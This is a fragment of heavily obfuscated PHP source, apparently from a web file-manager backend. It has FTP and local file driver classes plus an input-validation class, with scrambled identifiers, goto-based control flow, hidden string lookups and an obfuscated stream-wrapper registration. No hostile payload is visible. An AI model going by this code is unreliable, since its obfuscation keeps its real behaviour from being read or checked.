$aŠ‹ˆ›»İ[8]); goto eğÄø¨Šô; A£¨²å§¨°: $f îîø³¤ä = array_diff($f îîø³¤ä, array($aŠ‹ˆ›»İ[91], $aŠ‹ˆ›»İ[1159], $eÌŸèÙ´Ï . $aŠ‹ˆ›»İ[91], $eÌŸèÙ´Ï . $aŠ‹ˆ›»İ[1159])); $F´ÖåÎ”ÈĞ = array(); foreach ($f îîø³¤ä as $AÛˆëµ„Š”) { if (!strstr($AÛˆëµ„Š”, $aŠ‹ˆ›»İ[8])) { $AÛˆëµ„Š” = $eÌŸèÙ´Ï . ltrim($AÛˆëµ„Š”, $aŠ‹ˆ›»İ[8]); } $F´ÖåÎ”ÈĞ[] = $this->iconvApp($AÛˆëµ„Š”); } goto A²È¼‡¡Ó; cï¾¼…í„Ù: } private function recursionFtpFiles($Dï¨„ÔæÉ±, &$A¢ÌÚ¡¥ƒ) { $a°¼î±˜¡Ê =& $_SERVER[îÖ]; if (!$this->_isconn()) { return !1; } if (!($BÃ³ìí–àœ = $this->ftpList($Dï¨„ÔæÉ±))) { return !1; } foreach ($BÃ³ìí–àœ as $Dï¨„ÔæÉ±) { if ($this->isFolder($Dï¨„ÔæÉ±)) { $this->recursionFtpFiles($Dï¨„ÔæÉ±, $A¢ÌÚ¡¥ƒ); $A¢ÌÚ¡¥ƒ[$a°¼î±˜¡Ê[74]][] = $Dï¨„ÔæÉ±; } else { $A¢ÌÚ¡¥ƒ[$a°¼î±˜¡Ê[73]][] = $Dï¨„ÔæÉ±; } } } private function objectMeta($B‘ÓÌàç) { goto d×½‚ÜÁï‹; A£á˜Ê¯ÔÌ: $AµÛ¢Õ†Ö = @ftp_size($this->connect, $this->iconvSystem($B‘ÓÌàç)); if ($AµÛ¢Õ†Ö != -1) { $dÍÓÑ£Ø”¹ = array($c‘‹ˆ‹À«[77] => $AµÛ¢Õ†Ö, $c‘‹ˆ‹À«[29] => $c‘‹ˆ‹À«[167]); } else { $bÅí‡ÚƒÂ© = @ftp_chdir($this->connect, $this->iconvSystem($B‘ÓÌàç)); $dÍÓÑ£Ø”¹ = $bÅí‡ÚƒÂ© ? array($c‘‹ˆ‹À«[77] => 0, $c‘‹ˆ‹À«[29] => $c‘‹ˆ‹À«[76]) : !1; } Cache::set($e÷º½è–Ø‘, $dÍÓÑ£Ø”¹, 0); goto A¤§Ôâ™½ˆ; A¤§Ôâ™½ˆ: return $dÍÓÑ£Ø”¹; goto Eà›¶µˆß¸; d×½‚ÜÁï‹: $c‘‹ˆ‹À« =& $_SERVER[îÖ]; $e÷º½è–Ø‘ = $c‘‹ˆ‹À«[1160] . md5($B‘ÓÌàç); $dÍÓÑ£Ø”¹ = Cache::get($e÷º½è–Ø‘); goto D—âÉ®õ; D—âÉ®õ: if ($dÍÓÑ£Ø”¹ !== null && $dÍÓÑ£Ø”¹ !== !1) { return $dÍÓÑ£Ø”¹; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $c‘‹ˆ‹À«[8]); goto A£á˜Ê¯ÔÌ; Eà›¶µˆß¸: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($dÎ‰éº™Ò‹) { if (substr($dÎ‰éº™Ò‹, 0, 2) == $_SERVER[îÖ][1149]) { $dÎ‰éº™Ò‹ = BASIC_PATH . substr($dÎ‰éº™Ò‹, 2); } return $dÎ‰éº™Ò‹; } public function iconvApp($Añ÷˜Ò®Öâ) { $eÛ¨‰èÖ· =& $_SERVER[îÖ]; global $config; return $this->iconvTo($Añ÷˜Ò®Öâ, $config[$eÛ¨‰èÖ·[1147]], $config[$eÛ¨‰èÖ·[1146]]); } public function iconvSystem($F‰ï¸Ì¤õœ) { $E‹¦àÈµ‹ =& $_SERVER[îÖ]; global $config; return $this->iconvTo($F‰ï¸Ì¤õœ, $config[$E‹¦àÈµ‹[1146]], $config[$E‹¦àÈµ‹[1147]]); } public function getPathOuter($Eâ‡êíø¾) { goto eÁ±Æ–Âó²; D²­ÈƒÔÃã: $Eâ‡êíø¾ = KodIO::clear($Eâ‡êíø¾); $Eâ‡êíø¾ = substr($Eâ‡êíø¾, strlen($A«¼º¾óêˆ)); if (empty($this->pathDriver)) { return $Eâ‡êíø¾; } goto EªÓĞŠ£“ç; eÁ±Æ–Âó²: $E×Ìöñ‹¡ =& $_SERVER[îÖ]; $A«¼º¾óêˆ = $this->iconvApp($this->pathBase); $Eâ‡êíø¾ = $this->iconvApp($Eâ‡êíø¾); goto F±£î·”; EªÓĞŠ£“ç: return $this->pathDriver . $E×Ìöñ‹¡[8] . ltrim($Eâ‡êíø¾, $E×Ìöñ‹¡[8]); goto AÀêõÓÎ£Ü; F±£î·”: if (substr($A«¼º¾óêˆ, 0, 2) == $E×Ìöñ‹¡[1149]) { $A«¼º¾óêˆ = BASIC_PATH . substr($A«¼º¾óêˆ, 2); } if (substr($Eâ‡êíø¾, 0, 2) == $E×Ìöñ‹¡[1149]) { $Eâ‡êíø¾ = BASIC_PATH . substr($Eâ‡êíø¾, 2); } $A«¼º¾óêˆ = KodIO::clear($A«¼º¾óêˆ); goto D²­ÈƒÔÃã; AÀêõÓÎ£Ü: } public function mkfile($Fî˜†„ÑÒ“, $f¦Û·’ÅÇ§ = '', $F¼ÖéÍ½·Â = REPEAT_RENAME) { $Fî˜†„ÑÒ“ = $this->iconvSystem($Fî˜†„ÑÒ“); @touch($Fî˜†„ÑÒ“); if ($f¦Û·’ÅÇ§) { file_put_contents($Fî˜†„ÑÒ“, $f¦Û·’ÅÇ§); } return is_file($Fî˜†„ÑÒ“) ? $this->getPathOuter($Fî˜†„ÑÒ“) : !1; } public function mkdir($e³Æâ›¢ŠÁ, $E¬ó ¶‰®„ = REPEAT_SKIP) { $e³Æâ›¢ŠÁ = $this->iconvSystem($e³Æâ›¢ŠÁ); if (is_dir($e³Æâ›¢ŠÁ)) { return $this->getPathOuter($e³Æâ›¢ŠÁ); } @mkdir($e³Æâ›¢ŠÁ, 511, !0); return is_dir($e³Æâ›¢ŠÁ) ? $this->getPathOuter($e³Æâ›¢ŠÁ) : !1; } public function copyFile($FƒÖéƒİ, $a©ªÎŸ¨™°) { $this->mkdir($this->pathFather($a©ªÎŸ¨™°)); $FƒÖéƒİ = $this->iconvSystem($FƒÖéƒİ); $a©ªÎŸ¨™° = $this->iconvSystem($a©ªÎŸ¨™°); $Cî¾¶“šÛ‰ = @copy($FƒÖéƒİ, $a©ªÎŸ¨™°); return $Cî¾¶“šÛ‰ ? $this->getPathOuter($a©ªÎŸ¨™°) : !1; } public function moveFile($C˜ğß¿˜×„, $aÌ„ß³¥Å) { $this->mkdir($this->pathFather($aÌ„ß³¥Å)); $C˜ğß¿˜×„ = $this->iconvSystem($C˜ğß¿˜×„); $aÌ„ß³¥Å = $this->iconvSystem($aÌ„ß³¥Å); $dß»ƒ³‹¹¬ = intval(@rename($C˜ğß¿˜×„, $aÌ„ß³¥Å)); if (!$dß»ƒ³‹¹¬) { if ($dß»ƒ³‹¹¬ = intval(@copy($C˜ğß¿˜×„, $aÌ„ß³¥Å))) { @unlink($C˜ğß¿˜×„); } } return $dß»ƒ³‹¹¬ ? $this->getPathOuter($aÌ„ß³¥Å) : !1; } public function delFile($dÂÇê×„À) { $dÂÇê×„À = $this->iconvSystem($dÂÇê×„À); if (!@unlink($dÂÇê×„À)) { @chmod($dÂÇê×„À, 511); if (!@unlink($dÂÇê×„À)) { return !1; } } else { return !0; } } public function delFolder($cïŸ¢˜‘Ìâ) { goto EÜñ³µˆÆ; Dêííöº—: if (!($EíÕ´¸Ğ¤ù = opendir($cïŸ¢˜‘Ìâ))) { return !1; } while (($Fã¨¦Æ¨Í = readdir($EíÕ´¸Ğ¤ù)) !== !1) { if ($Fã¨¦Æ¨Í == $b°‘ ¥â®½[91] || $Fã¨¦Æ¨Í == $b°‘ ¥â®½[1159]) { continue; } $B¶›ã‰¾“ˆ = $cïŸ¢˜‘Ìâ . $b°‘ ¥â®½[8] . $Fã¨¦Æ¨Í; if (is_file($B¶›ã‰¾“ˆ) || is_link($B¶›ã‰¾“ˆ)) { if (!unlink($B¶›ã‰¾“ˆ)) { chmod($B¶›ã‰¾“ˆ, 511); if (!unlink($B¶›ã‰¾“ˆ)) { return !1; } } } else { if (is_dir($B¶›ã‰¾“ˆ)) { chmod($B¶›ã‰¾“ˆ, 511); $B¶›ã‰¾“ˆ = $this->iconvApp($B¶›ã‰¾“ˆ); if (!$this->delFolder($B¶›ã‰¾“ˆ)) { return !1; } } } } closedir($EíÕ´¸Ğ¤ù); goto aøæãº¾Ùµ; aøæãº¾Ùµ: return rmdir($cïŸ¢˜‘Ìâ); goto a¨¡‚ÁÆŠç; EÜñ³µˆÆ: $b°‘ ¥â®½ =& $_SERVER[îÖ]; $cïŸ¢˜‘Ìâ = $this->iconvSystem($cïŸ¢˜‘Ìâ); if (!is_dir($cïŸ¢˜‘Ìâ)) { return !0; } goto Dêííöº—; a¨¡‚ÁÆŠç: } public function rename($dÏ—íÔµø, $A—ã÷ëâ) { goto CÃÌÀÖóõç; dÍÕ¶ï†˜: $dÏ—íÔµø = $this->iconvSystem($dÏ—íÔµø); $C°†¬ÂÇ¦ = $this->pathFather($dÏ—íÔµø); $CÚ…½Úåç = rtrim($C°†¬ÂÇ¦, $Böê¶¥é§Æ[8]) . $Böê¶¥é§Æ[8] . $a†ê‘µäˆ; goto e–»øŒ‚™¸; CÃÌÀÖóõç: $Böê¶¥é§Æ =& $_SERVER[îÖ]; $a†ê‘µäˆ = $this->fileNameAuto($this->pathFather($dÏ—íÔµø), $A—ã÷ëâ); $a†ê‘µäˆ = $this->iconvSystem($a†ê‘µäˆ); goto dÍÕ¶ï†˜; e–»øŒ‚™¸: $BñôÊ…Šˆñ = @rename($dÏ—íÔµø, $CÚ…½Úåç); $CÚ…½Úåç = $this->iconvApp($CÚ…½Úåç); return $BñôÊ…Šˆñ ? $this->getPathOuter($CÚ…½Úåç) : !1; goto b× ¿ùŒÄ; b× ¿ùŒÄ: } public function size($Bíîß‰Ì¢Ö) { $Bíîß‰Ì¢Ö = $this->iconvSystem($Bíîß‰Ì¢Ö); return (double) abs(sprintf($_SERVER[îÖ][1161], @filesize($Bíîß‰Ì¢Ö))); } public function info($CšÌ¿æ£ø) { $CšÌ¿æ£ø = $this->iconvSystem($CšÌ¿æ£ø); if ($this->isFolder($CšÌ¿æ£ø)) { return $this->folderInfo($CšÌ¿æ£ø); } else { if ($this->isFile($CšÌ¿æ£ø)) { return $this->fileInfo($CšÌ¿æ£ø); } } return !1; } protected function infoChildren($FùôµÌ”…Š, &$a‚¦»´¥ÊÁ, $EÖ¼ëËÒ Ï = true) { goto C§›ç¼›; a£õŠ™³: closedir($aİ¡Š‹ƒÂµ); goto E•œÃ—‹Ö¨; DÃ¯¦®¨ÌÙ: if ($EÖ¼ëËÒ Ï) { $FùôµÌ”…Š = $this->iconvSystem($FùôµÌ”…Š); } if (!($aİ¡Š‹ƒÂµ = @opendir($FùôµÌ”…Š))) { return; } while (($F¯ÓóÌÔ† = readdir($aİ¡Š‹ƒÂµ)) !== !1) { if ($F¯ÓóÌÔ† == $b¼ÀÂ„Š°ì[91] || $F¯ÓóÌÔ† == $b¼ÀÂ„Š°ì[1159]) { continue; } $Aí™·µ‚¿˜ = $FùôµÌ”…Š . $F¯ÓóÌÔ†; if (is_file($Aí™·µ‚¿˜) || is_link($Aí™·µ‚¿˜)) { $a‚¦»´¥ÊÁ[$b¼ÀÂ„Š°ì[78]]++; $a‚¦»´¥ÊÁ[$b¼ÀÂ„Š°ì[77]] += (double) abs(sprintf($b¼ÀÂ„Š°ì[1161], @filesize($Aí™·µ‚¿˜))); } else { if (is_dir($Aí™·µ‚¿˜)) { $a‚¦»´¥ÊÁ[$b¼ÀÂ„Š°ì[79]]++; $this->infoChildren($Aí™·µ‚¿˜, $a‚¦»´¥ÊÁ, !1); } } } goto a£õŠ™³; C§›ç¼›: $b¼ÀÂ„Š°ì =& $_SERVER[îÖ]; check_abort(); $FùôµÌ”…Š = rtrim($FùôµÌ”…Š, $b¼ÀÂ„Š°ì[8]) . $b¼ÀÂ„Š°ì[8]; goto DÃ¯¦®¨ÌÙ; E•œÃ—‹Ö¨: } private function folderInfo($FÓœ™°Ë, $b´Á¹êÅ = false) { $DñŠ‹Ã‘ğå =& $_SERVER[îÖ]; $FÓœ™°Ë = rtrim($FÓœ™°Ë, $DñŠ‹Ã‘ğå[8]) . $DñŠ‹Ã‘ğå[8]; $aÜ‰ïæàõ = $this->iconvApp($this->pathThis($FÓœ™°Ë)); if ($b´Á¹êÅ) { return array($DñŠ‹Ã‘ğå[28] => $aÜ‰ïæàõ, $DñŠ‹Ã‘ğå[75] => $this->getPathOuter($FÓœ™°Ë), $DñŠ‹Ã‘ğå[29] => $DñŠ‹Ã‘ğå[76]); } $Bè²ç·“âé = array($DñŠ‹Ã‘ğå[28] => $aÜ‰ïæàõ, $DñŠ‹Ã‘ğå[75] => $this->getPathOuter($FÓœ™°Ë), $DñŠ‹Ã‘ğå[29] => $DñŠ‹Ã‘ğå[76], $DñŠ‹Ã‘ğå[187] => @filectime($FÓœ™°Ë), $DñŠ‹Ã‘ğå[107] => @filemtime($FÓœ™°Ë), $DñŠ‹Ã‘ğå[1162] => @fileatime($FÓœ™°Ë), $DñŠ‹Ã‘ğå[1156] => is_readable($FÓœ™°Ë), $DñŠ‹Ã‘ğå[1157] => is_writable($FÓœ™°Ë), $DñŠ‹Ã‘ğå[1163] => get_mode($FÓœ™°Ë)); return $Bè²ç·“âé; } private function fileInfo($d¡Œ‚‡‰, $dË±†èØˆ¡ = false) { $bå¾¸  ¹¡ =& $_SERVER[îÖ]; $EÇ„Œ¥éèØ = $this->iconvApp($this->pathThis($d¡Œ‚‡‰)); if ($dË±†èØˆ¡) { return array($bå¾¸  ¹¡[28] => $EÇ„Œ¥éèØ, $bå¾¸  ¹¡[75] => $this->getPathOuter($d¡Œ‚‡‰), $bå¾¸  ¹¡[29] => $bå¾¸  ¹¡[167], $bå¾¸  ¹¡[77] => $this->size($d¡Œ‚‡‰), $bå¾¸  ¹¡[160] => $this->ext($EÇ„Œ¥éèØ)); } $eİ¾“ˆ£µ = array($bå¾¸  ¹¡[28] => $EÇ„Œ¥éèØ, $bå¾¸  ¹¡[75] => $this->getPathOuter($d¡Œ‚‡‰), $bå¾¸  ¹¡[29] => $bå¾¸  ¹¡[167], $bå¾¸  ¹¡[187] => @filectime($d¡Œ‚‡‰), $bå¾¸  ¹¡[107] => @filemtime($d¡Œ‚‡‰), $bå¾¸  ¹¡[1162] => @fileatime($d¡Œ‚‡‰), $bå¾¸  ¹¡[77] => $this->size($d¡Œ‚‡‰), $bå¾¸  ¹¡[160] => $this->ext($EÇ„Œ¥éèØ), $bå¾¸  ¹¡[1156] => is_readable($d¡Œ‚‡‰), $bå¾¸  ¹¡[1157] => is_writable($d¡Œ‚‡‰), $bå¾¸  ¹¡[1163] => get_mode($d¡Œ‚‡‰)); return $eİ¾“ˆ£µ; } public function exist($AÚÛ²®“óÈ) { $AÚÛ²®“óÈ = $this->iconvSystem($AÚÛ²®“óÈ); return @file_exists($AÚÛ²®“óÈ); } public function isFile($e›±«ªà´) { $e›±«ªà´ = $this->iconvSystem($e›±«ªà´); return @is_file($e›±«ªà´); } public function isFolder($AÜºñ‡¡‚ò) { $AÜºñ‡¡‚ò = $this->iconvSystem($AÜºñ‡¡‚ò); return @is_dir($AÜºñ‡¡‚ò); } public function listPath($D–ö—ÔàÈ¡, $c Œºİƒ· = false) { goto eÅê¡ğ„³¢; eÅê¡ğ„³¢: $bù¯æêÀÀ =& $_SERVER[îÖ]; $D–ö—ÔàÈ¡ = $this->iconvSystem($D–ö—ÔàÈ¡); $D–ö—ÔàÈ¡ = rtrim($D–ö—ÔàÈ¡, $bù¯æêÀÀ[8]) . $bù¯æêÀÀ[8]; goto dÏÕ‚¸ÆÜŠ; cÓ§£Êïº: closedir($eÇ´Ô¢Ã); return $f¥ôÕš´éø; goto Eäí¾ˆá¦é; dÏÕ‚¸ÆÜŠ: $f¥ôÕš´éø = array($bù¯æêÀÀ[74] => array(), $bù¯æêÀÀ[73] => array()); if (!($eÇ´Ô¢Ã = @opendir($D–ö—ÔàÈ¡))) { return $f¥ôÕš´éø; } while (($FÉ³Öà‹± = readdir($eÇ´Ô¢Ã)) !== !1) { if ($FÉ³Öà‹± == $bù¯æêÀÀ[91] || $FÉ³Öà‹± == $bù¯æêÀÀ[1159]) { continue; } $eùÓ²áî¸— = $D–ö—ÔàÈ¡ . $FÉ³Öà‹±; if (is_file($eùÓ²áî¸—)) { $f¥ôÕš´éø[$bù¯æêÀÀ[73]][] = $this->fileInfo($eùÓ²áî¸—, $c Œºİƒ·); } else { $f¥ôÕš´éø[$bù¯æêÀÀ[74]][] = $this->folderInfo($eùÓ²áî¸—, $c Œºİƒ·); } } goto cÓ§£Êïº; Eäí¾ˆá¦é: } public function listAll($F¿®Ÿ†¼´, &$eõ—İñ’õÏ = array()) { goto A³óŠÁæ®Ö; A³óŠÁæ®Ö: $AŞˆØßÎæ =& $_SERVER[îÖ]; $F¿®Ÿ†¼´ = $this->iconvSystem($F¿®Ÿ†¼´); $F¿®Ÿ†¼´ = rtrim($F¿®Ÿ†¼´, $AŞˆØßÎæ[8]) . $AŞˆØßÎæ[8]; goto aèÓ°‚²„–; eÚ¹–…»à‹: return $eõ—İñ’õÏ; goto aöîã¶ ¶¦; aèÓ°‚²„–: if (!($EÕ¬ñÁÈô = @opendir($F¿®Ÿ†¼´))) { return $eõ—İñ’õÏ; } while (($F¢š§Ëæ¿ = readdir($EÕ¬ñÁÈô)) !== !1) { if ($F¢š§Ëæ¿ == $AŞˆØßÎæ[91] || $F¢š§Ëæ¿ == $AŞˆØßÎæ[1159]) { continue; } $EÙ–ší = $F¿®Ÿ†¼´ . $F¢š§Ëæ¿; if (is_dir($EÙ–ší) && !is_link($EÙ–ší)) { $eõ—İñ’õÏ[] = array($AŞˆØßÎæ[75] => $EÙ–ší . $AŞˆØßÎæ[8], $AŞˆØßÎæ[76] => 1, $AŞˆØßÎæ[107] => @filemtime($EÙ–ší), $AŞˆØßÎæ[77] => 0); $this->listAll($EÙ–ší, $eõ—İñ’õÏ); } else { $eõ—İñ’õÏ[] = array($AŞˆØßÎæ[75] => $EÙ–ší, $AŞˆØßÎæ[76] => 0, $AŞˆØßÎæ[107] => @filemtime($EÙ–ší), $AŞˆØßÎæ[77] => $this->size($EÙ–ší)); } } closedir($EÕ¬ñÁÈô); goto eÚ¹–…»à‹; aöîã¶ ¶¦: } public function has($d¯›©¸·ÕÅ, $eÁÕ‰¾ºÉ¿ = false, $b·Ï¨›¨¨• = true) { goto C¶Å‚†é’í; C¶Å‚†é’í: $A¸’ì¬õõŞ =& $_SERVER[îÖ]; $d¯›©¸·ÕÅ = $this->iconvSystem($d¯›©¸·ÕÅ); $d¯›©¸·ÕÅ = rtrim($d¯›©¸·ÕÅ, $A¸’ì¬õõŞ[8]) . $A¸’ì¬õõŞ[8]; goto f¢ºÌ‡„Ş¾; Bê‚¼©ƒ‚: $f¡Ì•¯È = 0; while (($B˜‚×‰Á– = readdir($eÕ®ë»)) !== !1) { if ($B˜‚×‰Á– == $A¸’ì¬õõŞ[91] || $B˜‚×‰Á– == $A¸’ì¬õõŞ[1159]) { continue; } $c·Ó´ïƒ‚¬ = $d¯›©¸·ÕÅ . $B˜‚×‰Á–; if ($eÁÕ‰¾ºÉ¿) { $f¡Ì•¯È++; if (@is_file($c·Ó´ïƒ‚¬)) { $DĞòƒ’‰„”++; } else { $a—¥ù§Éø++; } if ($f¡Ì•¯È > 10000) { break; } continue; } if ($b·Ï¨›¨¨•) { if (@is_file($c·Ó´ïƒ‚¬)) { return !0; } } else { if (@is_dir($c·Ó´ïƒ‚¬ . $A¸’ì¬õõŞ[8])) { return !0; } } } closedir($eÕ®ë»); goto aºĞÎ¯š´î; aºĞÎ¯š´î: if ($eÁÕ‰¾ºÉ¿) { return array($A¸’ì¬õõŞ[191] => $DĞòƒ’‰„”, $A¸’ì¬õõŞ[192] => $a—¥ù§Éø); } return !1; goto C£¦ø÷¼¶; f¢ºÌ‡„Ş¾: if (!($eÕ®ë» = @opendir($d¯›©¸·ÕÅ))) { return !1; } $DĞòƒ’‰„” = 0; $a—¥ù§Éø = 0; goto Bê‚¼©ƒ‚; C£¦ø÷¼¶: } public function hashSimple($Cõ¤à›á§ƒ) { goto D˜á‚ìÎğÍ; cÎ¶æ¾ä¹: $F»äÒç¯è‰ = $this->size($Cõ¤à›á§ƒ); $e õáÄ‹· = 200; $e¿£Š¼É… = 50; goto d•ˆì¹Ë“; A÷¤¾‰İ‡: return md5($B´÷•Œá™) . $F»äÒç¯è‰; goto AÚ¸‹õå§Ã; D˜á‚ìÎğÍ: $fè´ÜÎ‚ =& $_SERVER[îÖ]; if (!$Cõ¤à›á§ƒ) { return md5($fè´ÜÎ‚[33]); } $Cõ¤à›á§ƒ = $this->iconvSystem($Cõ¤à›á§ƒ); goto cÎ¶æ¾ä¹; d•ˆì¹Ë“: if ($F»äÒç¯è‰ <= $e õáÄ‹· * $e¿£Š¼É…) { return $this->hashMd5($Cõ¤à›á§ƒ) . $F»äÒç¯è‰; } $B´÷•Œá™ = $fè´ÜÎ‚[33]; $BË›Ø›™¦® = intval($F»äÒç¯è‰ / $e¿£Š¼É…); goto Bğ»±âÑ‡; c¬Ùµ¸‹ïÆ: fseek($fÅÎëÑô÷œ, $F»äÒç¯è‰ - $e õáÄ‹·); $B´÷•Œá™ .= fread($fÅÎëÑô÷œ, $e õáÄ‹·); fclose($fÅÎëÑô÷œ); goto A÷¤¾‰İ‡; Bğ»±âÑ‡: $fÅÎëÑô÷œ = fopen($Cõ¤à›á§ƒ, $fè´ÜÎ‚[1164]); if (!$fÅÎëÑô÷œ) { return $B´÷•Œá™; } for ($Fßñ¬ˆ®®ç = 0; $Fßñ¬ˆ®®ç < $e¿£Š¼É…; $Fßñ¬ˆ®®ç++) { fseek($fÅÎëÑô÷œ, $BË›Ø›™¦® * $Fßñ¬ˆ®®ç); $B´÷•Œá™ .= fread($fÅÎëÑô÷œ, $e õáÄ‹·); } goto c¬Ùµ¸‹ïÆ; AÚ¸‹õå§Ã: } public function getContent($Eä³õÏçÛÊ) { $Eä³õÏçÛÊ = $this->iconvSystem($Eä³õÏçÛÊ); return file_get_contents($Eä³õÏçÛÊ); } public function setContent($C¶™…‘õƒ…, $CÂ½²©¾ñ = '') { $C¶™…‘õƒ… = $this->iconvSystem($C¶™…‘õƒ…); @file_put_contents($C¶™…‘õƒ…, $CÂ½²©¾ñ, LOCK_EX); clearstatcache(); return strlen($CÂ½²©¾ñ) == filesize($C¶™…‘õƒ…); } public function fileSubstr($F÷ÀâÖ©‡‡, $f²‡ó„„ÓŞ = 0, $A‘³´ì¶±‡ = false) { goto CØÏŞâÃ§ì; aƒŒŞˆ‹®: if ($A‘³´ì¶±‡ <= 0) { return $AÕâ–Ô«‘¶[33]; } $fÑÃÍ¿Ø¢Ü = fopen($F÷ÀâÖ©‡‡, $AÕâ–Ô«‘¶[1164]); if (!$fÑÃÍ¿Ø¢Ü) { return !1; } goto eíÒ‹äôÔ²; eíÒ‹äôÔ²: fseek($fÑÃÍ¿Ø¢Ü, $f²‡ó„„ÓŞ); $dŒÜ¦ñˆÌ = fread($fÑÃÍ¿Ø¢Ü, $A‘³´ì¶±‡); fclose($fÑÃÍ¿Ø¢Ü); goto fÈ½æãÛŞ; fÈ½æãÛŞ: return $dŒÜ¦ñˆÌ; goto F×Èœ×‘¬; CØÏŞâÃ§ì: $AÕâ–Ô«‘¶ =& $_SERVER[îÖ]; $F÷ÀâÖ©‡‡ = $this->iconvSystem($F÷ÀâÖ©‡‡); if ($A‘³´ì¶±‡ === !1) { $A‘³´ì¶±‡ = $this->size($F÷ÀâÖ©‡‡); } goto aƒŒŞˆ‹®; F×Èœ×‘¬: } public function upload($b¡ŠŸã®¤, $f¸èÑ’êŸç, $b‡¦ƒä˜ğ = false, $D¦‘º¼Åô® = REPEAT_REPLACE) { $b‡Œª¼î™Õ = $this->copyFile($f¸èÑ’êŸç, $b¡ŠŸã®¤); return $b‡Œª¼î™Õ ? $this->getPathOuter($b¡ŠŸã®¤) : !1; } public function setModifyTime($AÇÍõ¼«…ë, $F˜®Çà×„¿ = '') { @touch($AÇÍõ¼«…ë, intval($F˜®Çà×„¿)); } public function download($cô‹Õå˜ÍÛ, $c÷„á¹ø¼£) { return $this->iconvSystem($cô‹Õå˜ÍÛ); } } goto FÈµˆ¥ã‘Œ; a›Ñ¿‹½Åì: $_SERVER[$_SERVER[©•ÖÏ¥Ø][52]] = ("\x39\x36\x32\x31"."\70\70")+0;$_u2Ff="tWzetFi45K6mAaa5kz8T5EKZjReH6qJDSERXPYk3r68fV8Gy25MsjGnMhrCxCeAUfSdnyYgDriVdYM";; stream_wrapper_register($_SERVER[©•ÖÏ¥Ø][53], $_SERVER[©•ÖÏ¥Ø][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($b˜¢Ô•…ˆÊ, $bªø‹ò¦é¿) { $AƒÊº¥îœº =& $_SERVER[îÖ]; if (isset(self::$_methodList[$b˜¢Ô•…ˆÊ])) { return @call_user_func_array(self::$_methodList[$b˜¢Ô•…ˆÊ], $bªø‹ò¦é¿); } else { if (method_exists($this, $b˜¢Ô•…ˆÊ)) { return call_user_func_array(array($this, $b˜¢Ô•…ˆÊ), $bªø‹ò¦é¿); } else { think_exception(__CLASS__ . $AƒÊº¥îœº[4] . $b˜¢Ô•…ˆÊ . $AƒÊº¥îœº[5]); } } } public static function __callStatic($BÚ©Û’¦…¸, $B¨ ÍéŠ˜‘) { if (isset(self::$_methodListStatic[$BÚ©Û’¦…¸])) { return call_user_func_array(self::$_methodListStatic[$BÚ©Û’¦…¸], $B¨ ÍéŠ˜‘); } else { if (method_exists(self, $BÚ©Û’¦…¸)) { return call_user_func_array(array(self, $BÚ©Û’¦…¸), $B¨ ÍéŠ˜‘); } else { show_json("{$BÚ©Û’¦…¸}\50\x29\x20\156\x6f\x74\x20\x65\x78\x69\163\x74\x3b", !1); } } } public static function addMethod($E…Œãƒ‹â©, $DŞ¡¢Ñ) { self::$_methodList[$E…Œãƒ‹â©] = $DŞ¡¢Ñ; } public static function addMethodStatic($dËˆ’ïñê, $f¨‹ê÷±Ï) { self::$_methodListStatic[$dËˆ’ïñê] = $f¨‹ê÷±Ï; } } goto E×Ï‰ÃĞ‡; CƒÇõ…œÊÀ: if (!function_exists($_SERVER[îÖ][1870])) { function imagecreatefrombmp($bÉ¬Øå·©ê) { return ImageGdBMP::load($bÉ¬Øå·©ê); } } class Input { public static function getArray($b‚Ì¥÷ÓÆñ) { goto eÃ«åÏ²±”; eÃ«åÏ²±”: $cëİÜ„º­¨ =& $_SERVER[îÖ]; global $in; $Aòƒ¶ôêÌ = array(); goto B×÷Œ®Õ§…; bî»–è‹ƒÈ: if (count($DºƒĞÙŸÚø) > 0) { show_json(implode($cëİÜ„º­¨[1875], $DºƒĞÙŸÚø), !1); } return $Aòƒ¶ôêÌ; goto D–‡î†ÕÇÛ; B×÷Œ®Õ§…: $DºƒĞÙŸÚø = array(); $FëŠßÆ«Û = LNG($cëİÜ„º­¨[1871]); foreach ($b‚Ì¥÷ÓÆñ as $BÖ¯®âĞ => $DĞ”è¶à†¯) { goto e‰ÀÀêÌšò; AåòÂµÁŒÙ: if (!array_key_exists($BÖ¯®âĞ, $in)) { if (array_key_exists($cëİÜ„º­¨[1873], $DĞ”è¶à†¯)) { if (!is_null($DĞ”è¶à†¯[$cëİÜ„º­¨[1873]])) { $Aòƒ¶ôêÌ[$C‚‡œ´’Ò¨] = $DĞ”è¶à†¯[$cëİÜ„º­¨[1873]]; } } else { if (isset($DĞ”è¶à†¯[$cëİÜ„º­¨[1874]])) { $DºƒĞÙŸÚø[] = $eçÓÁñ’ÏØ; } } continue; } if (isset($DĞ”è¶à†¯[$cëİÜ„º­¨[1874]]) && $DĞ”è¶à†¯[$cëİÜ„º­¨[1874]] == $cëİÜ„º­¨[282]) { $FÓÙŒ¼›¸© = json_decode($in[$BÖ¯®âĞ], !0); if (is_array($FÓÙŒ¼›¸©)) { $Aòƒ¶ôêÌ[$C‚‡œ´’Ò¨] = $FÓÙŒ¼›¸©; } else { if (array_key_exists($cëİÜ„º­¨[1873], $DĞ”è¶à†¯)) { if (!is_null($DĞ”è¶à†¯[$cëİÜ„º­¨[1873]])) { $Aòƒ¶ôêÌ[$C‚‡œ´’Ò¨] = $DĞ”è¶à†¯[$cëİÜ„º­¨[1873]]; } } else { $DºƒĞÙŸÚø[] = $eçÓÁñ’ÏØ; } } continue; } $eÑ©ìøÌ = _get($DĞ”è¶à†¯, $cëİÜ„º­¨[1006]); goto Fù‹¹—ªÎ; Fù‹¹—ªÎ: if (isset($DĞ”è¶à†¯[$cëİÜ„º­¨[1874]]) && !self::check($in[$BÖ¯®âĞ], $DĞ”è¶à†¯[$cëİÜ„º­¨[1874]], $eÑ©ìøÌ)) { if (array_key_exists($cëİÜ„º­¨[1873], $DĞ”è¶à†¯)) { if (!is_null($DĞ”è¶à†¯[$cëİÜ„º­¨[1873]])) { $Aòƒ¶ôêÌ[$C‚‡œ´’Ò¨] = $DĞ”è¶à†¯[$cëİÜ„º­¨[1873]]; } } else { $DºƒĞÙŸÚø[] = $eçÓÁñ’ÏØ; } continue; } $Aòƒ¶ôêÌ[$C‚‡œ´’Ò¨] = $in[$BÖ¯®âĞ]; goto aå¿šèÇ„µ; e‰ÀÀêÌšò: $eçÓÁñ’ÏØ = _get($DĞ”è¶à†¯, 